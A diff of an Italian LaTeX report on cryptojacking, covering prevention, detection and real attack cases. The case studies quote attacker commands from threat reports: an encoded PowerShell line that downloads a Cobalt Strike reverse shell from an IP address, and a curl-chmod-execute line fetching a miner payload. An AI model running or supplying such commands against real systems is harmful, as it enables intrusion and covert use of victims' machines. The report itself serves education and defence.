@@ -86,15 +86,18 @@ all'aggressore di accedere al dispositivo e alla sua connessione. Il
 proprietario può controllare la botnet utilizzando un software di comando e
 controllo (C\&C). [2] La parola "botnet" è una parola risultata dalla unione
 delle parole " robot " e " network ". Il termine è solitamente utilizzato con
-una connotazione negativa o malevola.\cite{Botnet}} potessero minare Bitcoin
-segretamente, sebbene la GPU di una sola macchina impiegherebbe molto tempo per
-minare una transizione in criptovalute, utilizzando una grande quantità di
-macchine si riesce a suddividere il lavoro e ridurre il tempo.
+una connotazione negativa o
+malevola.\footnote{\href{https://arc.net/l/quote/ftyxgxms}{Botnet, Wikipedia}}}
+potessero minare Bitcoin segretamente, sebbene la GPU di una sola macchina
+impiegherebbe molto tempo per minare una transizione in criptovalute,
+utilizzando una grande quantità di macchine si riesce a suddividere il lavoro e
+ridurre il tempo.
 
 Una serie di attacchi rilevanti di cryptojacking sono stati scoperti dal 2011 al
 2021. L'ultimo è relativo al "2021 Microsoft Exchange Server data breach"
-\cite{zero-day}, tale breccia, creata nel Gennaio 2021 ha permesso numerosi
-attacchi tra qui diversi di tipo cryptojacking.
+\footnote{\href{https://arc.net/l/quote/golshtco}{2021 Microsoft Exchange Server
+data breach, Wikipedia}}, tale breccia, creata nel Gennaio 2021 ha permesso
+numerosi attacchi tra qui diversi di tipo cryptojacking.
 
 Il cryptojacking è emerso come una minaccia significativa nel campo della
 cybersecurity intorno al 2017, con l'introduzione di Coinhive, dismesso poi a
@@ -104,16 +107,33 @@ criptovalute Monero (approfondimento nella sezione
 \hyperref[sec:aspetti_tecnici]{"Aspetti Tecnici"}). 
 
 \subsection{Struttura del documento}
-Fornisci una panoramica della struttura del documento, indicando brevemente cosa
-verrà trattato nelle diverse sezioni.
-
-\subsection{Importanza}
-Spiega perché l'argomento è rilevante o significativo. Questo aiuta a
-contestualizzare la tua discussione e a motivare l'interesse del lettore.
+La seguente relazione è strutturata in modo da fornire una panoramica generale
+del cryptojacking nei capitoli iniziali per poi approfondire maggiormente la
+parte tecnica che viene eseguita computazionalmente dalle macchine, in questa
+parte saranno definiti i concetti principali delle Curve Ellittiche che poi
+saranno usati per comprendere la tecnologia del mioning e gli aspetti che
+rendono Monero una criptovaluta di particolare rilevanza. Una volta compresa la
+parte tecnica si tornerà ad approfondire il perché Monero ed il cryptojacking
+siano così popolari, come individuare questo tipo di malware e come prevenire
+l'infiltrazione degli stessi nei nostri sistemi. In coda verranno presentati dei
+casi reali, nei quali vengo spiegati i passi che i cybercriminali hanno seguito
+per colpire alcune grandi realtà tecnologiche. L'ultimo capitolo è dedicato alla
+bibliografia.
 
 \subsection{Problema e Motivazione}
-Identifica il problema specifico che il tuo documento cerca di risolvere e
-spiega perché è importante affrontarlo.
+Questo documento punta a fornire al lettore una maggiore comprensione del mondo
+delle criptovalute e di come queste possono anche portare alcuni soggetti a
+compiere atti criminali allo scopo di arricchirsi con esse. Si vuole formire ai
+lettori le armi per comprendere se la propria macchina o quella su cui si sta
+lavorando sia infetta e come prevenire una possibile iniezzione di malware di
+cryptojacking.
+
+In questo periodo storico la computazione rapida ed efficiente sono
+deterministici nel ambito della ricerca e in quello del \textit{consumer} e, di
+conseguenza, trovarsi con macchine che impiegano parte della loro capacità di
+computazione per scopi di cui il proprietario della macchina non è a conoscenza
+causa gravi danni economici oltre a danni ambientali dovuti ad un non calcolato
+consumo energetico.
 
 \newpage
 
@@ -348,7 +368,7 @@ conoscere la chiave privata relativa a quella pubblica senza rivelare, appunto,
 quella privata. Questo algoritmo ci sarà utile per quando tratteremo le Ring
 Signature (tradotte: Firme ad Anello).
 
-\subsubsection*{Algoritmo}
+\subsubsection{Algoritmo}
 
 È fondamentale che tutti gli utenti della commuicazione concordino sul gruppo
 abeliano $ G $, di ordine $ q $, generato da $ g $ e per assunzione in questo
@@ -499,7 +519,7 @@ Parafrasando Butrin\footnote{Vitalik Buterin, co-fondatore di Etherium}:
     destinatario, Bob, può controllare la transazione. Un altro modo di pensare
     a un indirizzo invisibile è come un indirizzo di portafoglio legato
     crittograficamente all’indirizzo pubblico di Bob, ma che viene rivelato solo
-    alle parti che effettuano la transazione. \cite{Buterin Quote}
+    alle parti che effettuano la transazione. - Buterin \cite{Buterin Quote}
 \end{quote}
 
 Questi One-time address sono anche detti Stealth Address. Il team di Buterin ha
@@ -553,21 +573,90 @@ un'altra.
 \newpage 
 
 \section{Popolarità}
+
+\subsection{Vantaggi Economici}
 La popolarità è dovuta al potenziale guadagno, guadagno molto facile da crearsi
 poiché per definizoione il cryptojacking punta a sfruttare risorse in possesso
 di altri in modo gratuito. Così, anche considerando la volatilità delle cripto
 valute, esempio principe BitCoin, i margini di guadagno sono abbastanza alti da
 rendere il crimine un vero e proprio business. 
 
+\subsection{Difficoltà di Rilevamento}
+Il cryptojacking è concepito per operare in modo furtivo, rendendone ardua
+l'individuazione. Gli script malevoli agiscono silenziosamente in background,
+determinando un incremento nell'utilizzo della CPU e un degrado delle
+prestazioni del dispositivo, spesso senza che l'utente se ne accorga. Tale
+caratteristica conferisce al cryptojacking un carattere persistente e insidioso.
+
+\subsection{Crescita del fenomeno}
+Poichè i dispositivi connessi alla rete sono in continua diffusione e spesso le
+case produttrici non adottano sistemi di sicurezza adeguati, gli hacker hanno
+maggiore spazio di manovra per colpire un grande numero di dispositivi
+simultaneamente. Sono molto popolari anche le app malevole per dispositivi
+mobile che in apparenza sembrano innoque ma che nella realtà vanno a estrarre
+criptovalute usando il processore del dispositivo. Un fenomeno facilmente
+identificabile poichè porta ad un surriscaldamento anomalo del device.
+
 \newpage
 
 \section{Prevenire e individuare}
+
+\subsection{Prevenire}
+Per prevenire attacchi di cryptojacking, è fondamentale adottare una serie di
+misure di sicurezza e buone pratiche. Ecco alcune strategie efficaci:
+
+\subsubsection{Protezioni anti-malware}
+Sarebbe una buona pratica proteggere i propri dispositivi con anti-malware
+capaci di rilevare processi di cryptomining in esecuzione in background, gestite
+le estensioni browser scaricate dagli utenti e minimizzare il rischio dato dalla
+esecuzione di script malevoli eseguiti sui browser. Nel caso si dovesse
+proteggere un organizzione, sarebbe buona pratica andare a equipaggiare software
+del tipo sopracitato sia nei device endpoint che nei server.
+
+\subsubsection{Applicare patch di sicurezza e proteggere i server}
+Spesso gli hacker che puntano a creare un infrastruttura cryptojacking puntano a
+server esposti pubblicamennte con bassi livelli di protezione su cui caricare
+malware e da sfruttare per arrivare ad altri server. In questo caso, sarebbe
+utile andare ad applicare patch di sicurezza e disattivare servizi inutilizzati.
+
+\subsubsection{Utilizzare software SCA}
+I software SCA\footnote{Software Composition Analysis} permettono di andare ad
+analizzare il software open-source e le sue dipendenze delle sue componenti.
+Questi sistemi sono molto utili in fase di sviluppo per andare a rilevare
+vulnerabilità e backdoor presenti nel codice integrato proveniente da fonti non
+certificate. Questi software sono capaci di genereare degli \textit{SBOM}, cioè
+dei dettagliati resoconti su tutte le dipendenze e sui componenti che compongono
+l'applicazione che si sta analizzando.Così, si riesce a produrre software con la
+sicurezza che non contenga script di mining.
+
+\subsection{Individuare}
+Per quanto riguarda la rilevazione, siccome gli attacchi di cryptojacking sono
+sempre più sofisticati, è necessario adottare strategie di monitoraggio avanzate
+per individuare e contrastare tali minacce. Ecco alcune tecniche utili:
+
+\subsubsection{Addetrare il personale help-desk a riconoscere i sintomi del cryptojacking}
+Nel ambito della grande distribuzione di device e/o software il personale
+help-desk è spesso il primo a ricevere segnalazioni di problemi relativi a
+prestazioni lente o surriscaldamento dei dispositivi. In questi casi, è
+importante che il personale sia in grado di riconoscere i sintomi del
+cryptojacking e di agire di conseguenza, andando a segnalare il problema al
+reparto IT. Il reparto IT, a sua volta, dovrà eseguire un'analisi approfondita
+per individuare possibili brecce nei propri servizi o device endpoint e
+rilascaire aggiornamenti di sicurezza.
+
+\subsubsection{Monitoraggio del traffico di rete}
+Il monitoraggio del traffico di rete è un'ottima strategia per individuare
+attività sospette. Gli attacchi di cryptojacking, infatti, comportano un aumento
+del traffico di rete oltre che dell'utilizzo della CPU. Esistono vari strumenti
+per monitorare il traffico di rete, come Wireshark, che consentono di
+identificare rapidamente eventuali attività malevole. Sarebbe utile avere filti
+nelle interfacce di rete per bloccare eventuali pacchetti non certificati. 
 
 \newpage
 
 \section{Casi reali}
 
-\subsection{WatchDog targets Docker Engine API endpoints and Redis servers}
+\subsection{Il gruppo WatchDog attacca Docker Engine API endpoints and Redis servers}
 Un gruppo di hacker, chiamato WatchDog, ha attaccato i server
 Docker\footnote{Docker è una piattaforma software che permette di creare,
 testare e distribuire applicazioni con la massima rapidità. Docker raccoglie il
@@ -588,17 +677,17 @@ caricare un miner XMRRig\footnote{Un software di mining di Monero}. Un ultimo
 Payload è una serie di script che gli intrusi usano per puntare ad altri sisteme
 collegati alla rete del container.\cite{WatchDog}
 
-\subsection{Alibaba ECS instances in cryptomining crosshairs}
+\subsection{Malware di cryptojacking all intero di istanzer Alibaba ECS}
 Come nel caso di Docker, anche in questo caso gli hacker hanno puntato alle
 sfrutture cloud, ma di Alibaba. I gruppi in question esembrerebbero essere
 TeamTNT, Kinsing ed altri.
 
-I server Alibaba ECS\footnote{Elastic Compute Service} sono forniti con un preinstallato 
-agente di sicurezza.  
+I server Alibaba ECS\footnote{Elastic Compute Service} sono forniti con un
+preinstallato agente di sicurezza.  
 
-Di seguito un codice specifico del malware che crea
-regole firewall per eliminare i pacchetti in entrata da intervalli IP
-appartenenti a zone e regioni interne di Alibaba.
+Di seguito un codice specifico del malware che crea regole firewall per
+eliminare i pacchetti in entrata da intervalli IP appartenenti a zone e regioni
+interne di Alibaba.
 
 \begin{figure}[ht]
     \centering
@@ -621,6 +710,135 @@ intervenire per arrestare l'infezione e le attività malevole. Alibaba Cloud
 Security fornisce indicazioni su come procedere, ma la responsabilità principale
 dell'utente rimane quella di prevenire l'infezione fin dall'inizio.
 
+\subsection{Orde di bot attaccano gli WMware Horizon server per minare}
+Nel dicembre del 2021, dopo la scoperta della falla nella di Log4J Shell (la
+quale permetteva di eseguire codice da remoto) è stato rilevato un attacco ai
+sistemi VMware Horizon\footnote{Applicazione dekstop che permette di
+vitualizzare diverse piattaforme, particolarmente utilizzata nelle organizzioni
+che prevedono smart-working}, che utilizzavano questa libreria. L'attacco è
+stato fatto sffruttando una particolare risorsa di Log4J: Lightweight Directory
+Access Protocol che permetteva di creare una shell web dalla quale ci si poteva
+collegare da remoto.\cite{VMware}
+
+\paragraph{Attacco: VMware -> Tomcat -> Cobalt} Gli hacker inziano l'attacco
+eseguendo il servizio Tomcat che termina con l'esecuzione dello script
+PowerShell, il quale a sua volta esegue una "reverse shell standard" di Cobalt
+Strike:
+
+\begin{verbatim}
+    powershell.exe -exec bypass -enc 
+    aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQB
+    tAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG
+    8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMQ
+    AxADIALgA4ADMALgAxADEANgA6ADgAMAA4ADAALwBkAHIAdgAnACkAKQA=
+\end{verbatim}
+
+Il comando decodifica:
+
+\begin{figure}[ht]
+    \centering
+    \includegraphics[width=0.95\textwidth]{./images/powershell1.png}
+    \caption{Comando su powershell}
+    \label{fig:powershell_command1}
+\end{figure}
+
+Viene scaricato il file \\
+\textit{sha256:6c7182d945e7e7ae8f7c289c9f4655295408cf14b72bab9686cc8dbebe845f4e}
+che rappresenta la reverse shell Cobalt Strike.
+
+Questo attacco, però, lasciava diverse tracce.
+
+\paragraph{Attacco: Log4J -> VMware-Horizon}
+Un attacco più difficile da individuare è quello che sfrutta direttamente la
+falla di Log4Shell per arrivare al server Tomacat.
+
+Nella poweshell, viene eseguito il seguente codice che permette al intruso di
+prendere il controllo della macchina:
+
+\begin{figure}[ht]
+    \centering
+    \includegraphics[width=0.95\textwidth]{./images/powershell2.png}
+    \caption{Comando su powershell}
+    \label{fig:powershell_command2}
+\end{figure}
+
+Il quale decodificato:
+
+\begin{figure}[ht]
+    \centering
+    \includegraphics[width=0.95\textwidth]{./images/powershell3.png}
+    \caption{Comando su powershell}
+    \label{fig:powershell_command3}
+\end{figure}
+
+\paragraph{Payload} Sono stati rilevati diversi software di mining di Monero,
+tra questi troviamo z0Mibner, JavaX miner, varianti di XMRing, Jin bot e Minu
+bot. Vengono anche caricate delle backdoor\footnote{Interfaccia di rete che
+permette gli intrusi di acccedere alle macchine da remoto} come impianti Silver,
+agenti Atera, Splashtop Streamer e diverse reverse PowerShell.
+
+\subsection{Attacchi alla catena di fornitura tramite librerie npm}
+L'azienda produttrice di Sonatype\footnote{Antivirus} è riuscita a rilevare
+malware di cryptomining nascosti al interno di librerie npm\footnote{Node
+Package Manager, il gestore di pacchetti predefinito di Node.js}, le quali
+vengono usate in tutto il mondo. Uo dei pacchetti malevoli individuati è stato
+identificato come "ua-parser-js", questo pacchetto viene installato un numero di
+volte incredibilmente alto settimanalmente e così l'infezione è riuscita a
+propagarsi moltissimo orizontalmente.
+
+\subsection{Attacco brute force nelle macchine linux}
+Un gruppo di hacker nato in Romania ha attaccato le macchine Linux utilizzando
+un metodo brute force SSH, chiamato \textit{Diicot brute} per decifrare le
+password delle macchine con sistema operativo Linux. I crimanali avrebbero
+iniettato al interno di queste macchine software per mianare Monero, in oltre
+avrebbero collegato queste macchine a ben 2 botnet DDoS \footnote{Distributed
+Denial of Service}: la prima è \textit{DemonBot} e la seconda \textit{IRC Perl}.
+
+Fondamentalemente, gli hacker, cercavano credenziali di accesso deboli dei
+server SSH. Per trovare questo tipo di credenziali, i criminali, andavano a
+scansionare le porte dei server al fine di trovarne una aperta, una volta
+individuata vanno a richiedere informazioni dal server che risponde con un
+\textit{banner}. Questo banner indica che tipo di servizio offre il server, la
+sua versione e nel caso sia un server SSH potrebbe dare ulteriori dettagli sulla
+versione del software SSH in esecuzione. Una volta che gli hacker hanno trovato
+un accesso al server SSH, utilizzano un software di brute force per identificare
+credenziali valide per poi procedere con l'iniezzione del payload.
+
+\paragraph{Payload} Gli hacker eseguono nella sessione SSH il seguente codice:
+
+\begin{verbatim}
+    curl -O http://45[.]32[.]112[.]68/.sherifu/.93joshua && 
+                    chmod 777 .93joshua && ./.93joshua && uname -a
+\end{verbatim}
+
+Una volta preso il controllo della macchina, gli infiltrati installavano XMRing
+nella macchina.
+
+\subsection{Crypto farm nascoste in zone private}
+Il cryptojacking, anche se nella maggior parte delle volte è effettuato
+sfruttando le macchine delle vittime in alcuni casi può essere attutato andando
+a gravere solo sulle risorse energetiche della vittima. Non sono infatti rari i
+casi in cui i criminali installano delle farm più o meno grandi in edifici o
+stanze poco frequentati/e. Uno di questi è il casi è stato scoperto in Russia,
+dove la polizia di Orenburg, investigando su un eccessivo consumo di corrente,
+denununciato dalla compagnia pubblica statale, ha scoperto un impianto di
+farming in un edificio abbandonato. L'impianto era alimentato da un
+allacciamento illegale ad una stazione di trasformazione poco lontana. Sono
+stati trovati scafali e scafali di potenti GPU, nel seguente
+\href{https://youtu.be/aLTTRZJIvY4}{link} è possibile trovare un video della
+farm. Un altro caso noto è quello di un dipendente che scoprì una piccola farm
+in un magazzino della azienda per la quale lavora. Il dipendente notò un rumore
+strano provenire da una scatola su uno scafale, andandola ad aprire rivelò una
+serie di GPU in serie collegate alla rete aziendale che minavano criptovalute.
+Di seguito un'immagine.
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.40\textwidth]{./images/mini_farm.png}
+    \caption{Farm in una scatola}
+    \label{fig:mkini_farm}
+\end{figure}
+
 
 \newpage
 
@@ -631,20 +849,10 @@ dell'utente rimane quella di prevenire l'infezione fin dall'inizio.
 Ericka Chickowski, \href{https://arc.net/l/quote/karbftmg}{Cryptojacking
 explained: How to prevent, detect, and recover from it, CSO}, 20 Giugno, 2022
 
-\bibitem{Botnet}
-\href{https://arc.net/l/quote/ftyxgxms}{Botnet, Wikipedia}
-% \texttt{31-07-2024 13:00}
-
-\bibitem{zero-day}
-\href{https://arc.net/l/quote/golshtco}{2021 Microsoft Exchange Server data breach, Wikipedia}
-% \texttt{01-08-2024 16:00}
-
-\bibitem{Monero}
-\href{https://arc.net/l/quote/jffmkeln}{Monero, Wikipedia}
-% \texttt{01-08-2024 16:30}
-
 \bibitem{FMW}
-\href{https://arc.net/l/quote/kbarlqni}{Fileless malware, IEEE Xplore}
+Said Varlioglu, Nelly Elsayed, Zag ElSayed, Murat Ozer,
+\href{https://arc.net/l/quote/kbarlqni}{The Dangerous Combo: Fileless Malware
+and Cryptojacking}, 2022
 
 \bibitem{Buterin Quote}
 Valerio Diaco, \href{https://arc.net/l/quote/qirrmtbh}{\textit{Conosci gli
@@ -676,6 +884,17 @@ Targets Docker And Redis Servers In New Cryptojacking Campaign}, 06 Giugno 20222
 David Fiser, Alfredo Oliveira,
 \href{https://www.trendmicro.com/en_us/research/21/k/groups-target-alibaba-ecs-instances-for-cryptojacking.html}{Groups
 Target Alibaba ECS Instances for Cryptojacking}, 15 Novembre 2021
+
+\bibitem{VMware}
+Gabor Szappanos, Sean Gallagher,
+\href{https://news.sophos.com/en-us/2022/03/29/horde-of-miner-bots-and-backdoors-leveraged-log4j-to-attack-vmware-horizon-servers/}{Horde
+of miner bots and backdoors leveraged Log4J to attack VMware Horizon servers},
+29 Marzo 2022
+
+\bibitem{Linux Malware}
+Lisa Vaas,
+\href{https://threatpost.com/linux-cryptojacking-gang-romania/167783/}{Linux-Focused
+Cryptojacking Gang Tracked to Romania}, 14 Giugno 2021
 
 \end{thebibliography}
 
